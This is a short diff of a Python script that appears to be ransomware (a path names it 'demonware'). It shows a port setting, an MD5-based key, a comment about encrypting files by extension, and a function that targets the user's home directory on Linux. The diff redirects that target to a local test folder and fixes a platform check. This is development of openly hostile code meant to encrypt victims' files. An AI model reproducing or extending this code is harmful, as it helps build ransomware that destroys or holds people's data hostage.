@@ -197,7 +197,7 @@ Zeznzo
             except KeyboardInterrupt:
                 print('Closed...\n\n')
 
-        if platform.system() == 'Windows':
+        if platform == 'Windows':
             pass
         else:
             start_thread()
@@ -234,6 +234,7 @@ port = 8989
 #key = hashlib.sha1(gen_string().encode('utf-8')).hexdigest()
 #print(len(key))
 key = hashlib.md5(gen_string()).hexdigest()
+global platform
 platform = platform.system()
 
 # Encrypt file that endswith
@@ -246,7 +247,8 @@ def get_target():
     # Encrypt on this location
     # Users home on Linux
     if platform == 'Linux':
-        target = '/home/' + getpass.getuser() + '/'
+        #target = '/home/' + getpass.getuser() + '/'
+        target = '/home/lv-laptop/Documents/directories/programmeren/python/demonware/test' + '/'
         return target
 
     # Users home on Windows
